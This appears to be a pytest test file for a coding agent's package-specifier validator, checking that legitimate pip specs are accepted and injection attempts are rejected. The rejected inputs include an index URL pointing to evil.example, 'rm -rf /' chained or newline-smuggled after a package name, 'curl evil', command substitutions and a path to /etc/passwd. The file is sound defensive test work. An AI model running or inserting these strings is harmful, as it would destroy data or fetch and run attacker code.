"""包名校验：依赖安装等同于执行任意代码，参数注入必须在这里挡死。"""

from __future__ import annotations

import pytest

from coding_agent.tools.deps import PackageSpecError, validate_package


@pytest.mark.parametrize(
    "spec",
    [
        "requests",
        "requests>=2.31",
        "requests==2.31.0",
        "requests~=2.31",
        "requests[socks]",
        "requests[socks,use-chardet-on-py3]>=2.0",
        "Django",
        "python-dateutil",
        "ruamel.yaml",
        "pkg-name",
    ],
)
def test_accepts_legitimate_specs(spec: str) -> None:
    assert validate_package(spec) == spec


@pytest.mark.parametrize(
    "spec",
    [
        "",
        "   ",
        "--index-url=http://evil.example/simple",  # 参数注入
        "-e",
        "-r requirements.txt",
        "requests; rm -rf /",  # 命令拼接
        "requests && curl evil",
        "requests || true",
        "requests | tee /tmp/x",
        "$(whoami)",
        "`id`",
        "requests`id`",
        "req uests",  # 内部空格
        "requests\nrm -rf /",  # 换行
        "requests>out.txt",
        "requests&background",
        "../../etc/passwd",
        "requests/../..",
        "pkg\x00null",
        "pkg*",
        "pkg?",
    ],
)
def test_rejects_injection_attempts(spec: str) -> None:
    with pytest.raises(PackageSpecError):
        validate_package(spec)


def test_strips_surrounding_whitespace() -> None:
    assert validate_package("  requests  ") == "requests"


def test_rejects_leading_dash_regardless_of_what_follows() -> None:
    """- 开头一律拒绝：包管理器会把它们当成选项。"""
    for spec in ("--version", "-U", "--upgrade", "-"):
        with pytest.raises(PackageSpecError):
            validate_package(spec)
